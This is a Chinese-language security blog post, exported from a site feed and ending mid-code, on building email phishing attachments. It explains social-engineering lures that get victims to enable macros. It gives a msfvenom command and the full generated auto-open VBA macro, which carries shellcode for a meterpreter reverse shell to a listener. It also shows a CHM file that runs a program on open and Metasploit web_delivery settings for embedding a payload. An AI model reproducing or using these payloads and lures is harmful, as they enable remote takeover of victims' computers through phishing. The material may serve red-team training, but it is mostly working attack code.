class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6943</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>关于邮件钓鱼的哪些事</title>
    <link href="https://www.ascotbe.com/2020/07/26/Office_0x01/"/>
    <id>https://www.ascotbe.com/2020/07/26/Office_0x01/</id>
    <published>2020-07-26T13:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>漏洞利用那一节放到下篇吧，复现环境有点难找</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul><li>kail-2019.4</li><li>windows7 sp1 x64</li><li>windows10 x64</li></ul><h2 id="Office宏"><a href="#Office宏" class="headerlink" title="Office宏"></a>Office宏</h2><h3 id="首先来区别下Word和Excel各种后缀中的区别"><a href="#首先来区别下Word和Excel各种后缀中的区别" class="headerlink" title="首先来区别下Word和Excel各种后缀中的区别"></a>首先来区别下Word和Excel各种后缀中的区别</h3><h4 id="Word文档"><a href="#Word文档" class="headerlink" title="Word文档"></a>Word文档</h4><p>97-2003的旧版本文件名后缀就是**.doc**</p><p>从2007版以后后缀名是**.docx**</p><p><strong>docx</strong>厉害一点。它是被压缩过的文档，体积更小，能处理更加复杂的内容，访问速度更快。</p><p>如果把<strong>docx</strong>的改为<strong>zip</strong>的话可以解压出里面的所有数据，不过空文档大部分都是<strong>XM</strong>格式的文件</p><h4 id="Excel表格"><a href="#Excel表格" class="headerlink" title="Excel表格"></a>Excel表格</h4><p><strong>xls</strong>是一个特有的二进制格式，其核心结构是复合文档类型的结构，而<strong>xlsx</strong>的核心结构是<strong>XML</strong>类型的结构，采用的是基于<strong>XML</strong>的压缩方式，使其占用的空间更小。<strong>xlsx</strong>中最后一个x的意义就在于此。</p><p><strong>xls</strong>是2003版本下的文件 ，不管有没有宏程序的话都是<strong>xls</strong>文件 ，从2007开始做了区分，<strong>xlsm</strong>文件和<strong>xlsx</strong>文件都是excel 2007及其以后的文件，但前者是含有宏启用，Excel中默认情况下不自动启用宏，默认是<strong>xlsx</strong>。VBA中，如果不想保存代码，可以保存为<strong>xlsx</strong>，即可自动删除其中VBA代码，反之则保存为<strong>xlsm</strong>文件。</p><h3 id="如何诱导"><a href="#如何诱导" class="headerlink" title="如何诱导"></a>如何诱导</h3><p>宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。由于早些年宏病毒泛滥，现在Office的宏功能已经默认是禁用，但依然无法阻挡攻击者使用宏。那么如何引诱受害者开启宏功能就是关键了，常用的套路</p><ul><li>文档是被保护状态，需要启用宏才能查看；</li><li>添加一张模糊的图片，提示需要启用宏才能查看高清图片；</li><li>提示要查看文档，按给出的一系列步骤操作；</li><li>贴一张某杀毒软件的Logo图片，暗示文档被安全软件保护。</li></ul><h3 id="制作简单的宏文件"><a href="#制作简单的宏文件" class="headerlink" title="制作简单的宏文件"></a>制作简单的宏文件</h3><p>这边以Word文档来举例吧，会的大佬直接跳过，感觉整片会被跳过了（逃</p><p>先创建个文档<strong>doc</strong>和<strong>docx</strong>都行个人感觉没啥区别，如果是<strong>doc</strong>的话兼容性会更好</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/1.png?raw=true" alt="image-20200726202103886"></p><p>记得要开宏，默认是关的就很难受</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/2.png?raw=true" alt="image-20200726202204961"></p><p>然后在视图位置点击添加宏</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/3.png?raw=true" alt="image-20200726202317197"></p><p>然后添加后是这么一个玩意</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/4.png?raw=true" alt="image-20200726202406765"></p><p>接下来就是一些语法了，和常规编程差不多，各位应该看一眼就会了，然后该死的macOS11让我用不了虚拟机，这边全程使用windows来测试</p><p>首先我们来用msf生成个宏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.183.138 LPORT&#x3D;7890 -f vba -o ascotbe.vba</span><br></pre></td></tr></table></figure><p>这是我们生成的宏</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">If</span> Vba7 <span class="meta-keyword">Then</span></span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateThread <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Nyeo <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Pjfdx <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Acbomfr <span class="keyword">As</span> LongPtr, Gpzfu <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Groc <span class="keyword">As</span> <span class="type">Long</span>, Qrepb <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> VirtualAlloc <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Rpwgaj <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Ddbv <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Jduvicamq <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Glwnku <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> RtlMoveMemory <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Raftpjwrc <span class="keyword">As</span> LongPtr, <span class="keyword">ByRef</span> Wjiefyrxe <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Nvyyuvidk <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> CreateThread <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Nyeo <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Pjfdx <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Acbomfr <span class="keyword">As</span> <span class="type">Long</span>, Gpzfu <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Groc <span class="keyword">As</span> <span class="type">Long</span>, Qrepb <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> VirtualAlloc <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Rpwgaj <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Ddbv <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Jduvicamq <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Glwnku <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> RtlMoveMemory <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Raftpjwrc <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByRef</span> Wjiefyrxe <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Nvyyuvidk <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">#EndIf</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">        Dim Imtzv As Long, Laclv As Variant, Whxffnbhl As Long</span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> Vba7 <span class="meta-keyword">Then</span></span></span><br><span class="line">        <span class="keyword">Dim</span>  Esc <span class="keyword">As</span> LongPtr, Hyub <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">        <span class="keyword">Dim</span>  Esc <span class="keyword">As</span> <span class="type">Long</span>, Hyub <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">#EndIf</span><br><span class="line">        Laclv = Array(<span class="number">72</span>,<span class="number">131</span>,<span class="number">228</span>,<span class="number">240</span>,<span class="number">232</span>,<span class="number">204</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">81</span>,<span class="number">65</span>,<span class="number">80</span>,<span class="number">82</span>,<span class="number">81</span>,<span class="number">86</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">210</span>,<span class="number">101</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">96</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">24</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">114</span>,<span class="number">80</span>,<span class="number">72</span>,<span class="number">15</span>,<span class="number">183</span>,<span class="number">74</span>,<span class="number">74</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">172</span>,<span class="number">60</span>,<span class="number">97</span>,<span class="number">124</span>,<span class="number">2</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">193</span>,<span class="number">201</span>,<span class="number">13</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">193</span>,<span class="number">226</span>,<span class="number">237</span>,<span class="number">82</span>,<span class="number">65</span>,<span class="number">81</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">82</span>,<span class="number">32</span>,<span class="number">139</span>,<span class="number">66</span>,<span class="number">60</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">102</span>,<span class="number">129</span>,<span class="number">120</span>,<span class="number">24</span>, _</span><br><span class="line"><span class="number">11</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">133</span>,<span class="number">114</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">139</span>,<span class="number">128</span>,<span class="number">136</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">133</span>,<span class="number">192</span>,<span class="number">116</span>,<span class="number">103</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">80</span>,<span class="number">139</span>,<span class="number">72</span>,<span class="number">24</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">73</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">227</span>,<span class="number">86</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">201</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">52</span>,<span class="number">136</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">214</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">72</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">172</span>,<span class="number">65</span>,<span class="number">193</span>,<span class="number">201</span>,<span class="number">13</span>,<span class="number">65</span>,<span class="number">1</span>,<span class="number">193</span>,<span class="number">56</span>,<span class="number">224</span>,<span class="number">117</span>,<span class="number">241</span>,<span class="number">76</span>,<span class="number">3</span>,<span class="number">76</span>,<span class="number">36</span>,<span class="number">8</span>,<span class="number">69</span>,<span class="number">57</span>,<span class="number">209</span>,<span class="number">117</span>,<span class="number">216</span>,<span class="number">88</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">36</span>,<span class="number">73</span>,<span class="number">1</span>, _</span><br><span class="line"><span class="number">208</span>,<span class="number">102</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">12</span>,<span class="number">72</span>,<span class="number">68</span>,<span class="number">139</span>,<span class="number">64</span>,<span class="number">28</span>,<span class="number">73</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">65</span>,<span class="number">139</span>,<span class="number">4</span>,<span class="number">136</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">208</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">94</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">90</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">236</span>,<span class="number">32</span>,<span class="number">65</span>,<span class="number">82</span>,<span class="number">255</span>,<span class="number">224</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">72</span>,<span class="number">139</span>,<span class="number">18</span>,<span class="number">233</span>,<span class="number">75</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">93</span>,<span class="number">73</span>,<span class="number">190</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">50</span>,<span class="number">95</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">86</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">230</span>,<span class="number">72</span>,<span class="number">129</span>,<span class="number">236</span>,<span class="number">160</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">229</span>,<span class="number">73</span>, _</span><br><span class="line"><span class="number">188</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">30</span>,<span class="number">210</span>,<span class="number">192</span>,<span class="number">168</span>,<span class="number">183</span>,<span class="number">138</span>,<span class="number">65</span>,<span class="number">84</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">228</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">241</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">76</span>,<span class="number">119</span>,<span class="number">38</span>,<span class="number">7</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">234</span>,<span class="number">104</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">41</span>,<span class="number">128</span>,<span class="number">107</span>,<span class="number">0</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">106</span>,<span class="number">10</span>,<span class="number">65</span>,<span class="number">94</span>,<span class="number">80</span>,<span class="number">80</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">194</span>,<span class="number">72</span>,<span class="number">255</span>,<span class="number">192</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">193</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">234</span>,<span class="number">15</span>,<span class="number">223</span>,<span class="number">224</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">199</span>,<span class="number">106</span>,<span class="number">16</span>,<span class="number">65</span>, _</span><br><span class="line"><span class="number">88</span>,<span class="number">76</span>,<span class="number">137</span>,<span class="number">226</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">153</span>,<span class="number">165</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">133</span>,<span class="number">192</span>,<span class="number">116</span>,<span class="number">10</span>,<span class="number">73</span>,<span class="number">255</span>,<span class="number">206</span>,<span class="number">117</span>,<span class="number">229</span>,<span class="number">232</span>,<span class="number">147</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">236</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">226</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">106</span>,<span class="number">4</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">2</span>,<span class="number">217</span>,<span class="number">200</span>,<span class="number">95</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">131</span>,<span class="number">248</span>,<span class="number">0</span>,<span class="number">126</span>,<span class="number">85</span>,<span class="number">72</span>,<span class="number">131</span>,<span class="number">196</span>,<span class="number">32</span>,<span class="number">94</span>,<span class="number">137</span>,<span class="number">246</span>,<span class="number">106</span>,<span class="number">64</span>,<span class="number">65</span>,<span class="number">89</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">16</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">242</span>, _</span><br><span class="line"><span class="number">72</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">88</span>,<span class="number">164</span>,<span class="number">83</span>,<span class="number">229</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">195</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">199</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">201</span>,<span class="number">73</span>,<span class="number">137</span>,<span class="number">240</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">218</span>,<span class="number">72</span>,<span class="number">137</span>,<span class="number">249</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">2</span>,<span class="number">217</span>,<span class="number">200</span>,<span class="number">95</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">131</span>,<span class="number">248</span>,<span class="number">0</span>,<span class="number">125</span>,<span class="number">40</span>,<span class="number">88</span>,<span class="number">65</span>,<span class="number">87</span>,<span class="number">89</span>,<span class="number">104</span>,<span class="number">0</span>,<span class="number">64</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">0</span>,<span class="number">90</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">11</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">48</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">87</span>,<span class="number">89</span>,<span class="number">65</span>,<span class="number">186</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">77</span>,<span class="number">97</span>,<span class="number">255</span>,<span class="number">213</span>,<span class="number">73</span>,<span class="number">255</span>,<span class="number">206</span>,<span class="number">233</span>,<span class="number">60</span>,<span class="number">255</span>, _</span><br><span class="line"><span class="number">255</span>,<span class="number">255</span>,<span class="number">72</span>,<span class="number">1</span>,<span class="number">195</span>,<span class="number">72</span>,<span class="number">41</span>,<span class="number">198</span>,<span class="number">72</span>,<span class="number">133</span>,<span class="number">246</span>,<span class="number">117</span>,<span class="number">180</span>,<span class="number">65</span>,<span class="number">255</span>,<span class="number">231</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">0</span>,<span class="number">89</span>,<span class="number">73</span>,<span class="number">199</span>,<span class="number">194</span>,<span class="number">240</span>,<span class="number">181</span>,<span class="number">162</span>,<span class="number">86</span>,<span class="number">255</span>,<span class="number">213</span>)</span><br><span class="line"></span><br><span class="line">        Esc = VirtualAlloc(<span class="number">0</span>, UBound(Laclv), <span class="number">&amp;H1000</span>, <span class="number">&amp;H40</span>)</span><br><span class="line">        <span class="keyword">For</span> Whxffnbhl = LBound(Laclv) <span class="keyword">To</span> UBound(Laclv)</span><br><span class="line">                Imtzv = Laclv(Whxffnbhl)</span><br><span class="line">                Hyub = RtlMoveMemory(Esc + Whxffnbhl, Imtzv, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">Next</span> Whxffnbhl</span><br><span class="line">        Hyub = CreateThread(<span class="number">0</span>, <span class="number">0</span>, Esc, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">        Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Workbook_Open()</span><br><span class="line">        Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/5.png?raw=true" alt="image-20200726210839105"></p><p>保存下就可以</p><p>然后我们在kali上监听</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/6.png?raw=true" alt="image-20200726211842860"></p><p>带有宏的Word保存是这样的</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/7.png?raw=true" alt="image-20200726211912494"></p><p>我们运行下试试</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/8.png?raw=true" alt="image-20200726221726990"></p><p>上线成功</p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p>在PDF、Office文档中内嵌一个跳转链接是很早期的钓鱼方式，通过文字信息的引导，让受害者点开页面，如果缺乏戒心，就可能会获取到受害者的账号、密码、银行卡、身份证等信息。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/9.png?raw=true" alt="img"></p><h2 id="CHM文档"><a href="#CHM文档" class="headerlink" title="CHM文档"></a>CHM文档</h2><p>CHM是Windows帮助文件（如电子书）使用的扩展名，此文件可以被植入可执行代码。</p><p>缺点：其缺点就是打开时会出现弹黑框、卡顿，容易被察觉。</p><h3 id="收工制作钓鱼邮件"><a href="#收工制作钓鱼邮件" class="headerlink" title="收工制作钓鱼邮件"></a>收工制作钓鱼邮件</h3><p>制作一个CHM文档，使用EasyCHM来制作</p><p>创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。然后先将下列代码复制到根文件夹中的index.html中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">hello word </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,calc.exe&#x27;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line">x.Click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面说的根文件夹的index.html是运行就会执行文件，而另外test1和test2是需要点击才会执行的，所有这两个文件夹我们不填写任何东西</p><p>直接上GIF图来演示</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/10.gif?raw=true" alt="2"></p><h3 id="利用CS-msf制作钓鱼CHM文件"><a href="#利用CS-msf制作钓鱼CHM文件" class="headerlink" title="利用CS/msf制作钓鱼CHM文件"></a>利用CS/msf制作钓鱼CHM文件</h3><p>CS制作方式</p><p>点击attacks——&gt;web Drive by——&gt;scripted web Delivery</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/11.png?raw=true" alt="image-20200811174211768"></p><p>生成好的命令</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/12.png?raw=true" alt="image-20200811174319596"></p><p>MSF制作方式</p><p>执行如下命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery </span><br><span class="line"><span class="built_in">set</span> target 2</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.10.128 <span class="comment">#本机地址</span></span><br><span class="line"><span class="built_in">set</span> srvhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> srvport 8080</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Offer/13.png?raw=true" alt="1"></p><p>然后我们把MSF命令插入到CHM文件里面，注意执行的进程那边要用<code>,</code>号隔开</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Mousejack replay<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">command exec </span><br><span class="line"><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span 